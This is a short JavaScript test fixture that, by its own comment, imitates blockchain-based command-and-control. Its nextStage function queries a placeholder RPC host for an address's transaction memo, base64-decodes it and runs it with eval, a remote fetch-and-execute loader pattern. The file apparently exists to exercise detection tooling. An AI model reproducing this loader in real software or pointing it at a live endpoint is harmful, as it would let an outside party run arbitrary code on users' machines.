// TEST FIXTURE: imitates blockchain command-and-control. Never executed.
const rpc = 'https://rpc.example.invalid';

async function nextStage(address) {
  const res = await fetch(rpc, {
    method: 'POST',
    body: JSON.stringify({ method: 'getSignaturesForAddress', params: [address] }),
  });
  const memo = (await res.json()).result[0].memo;
  eval(atob(memo));
}

module.exports = { nextStage };
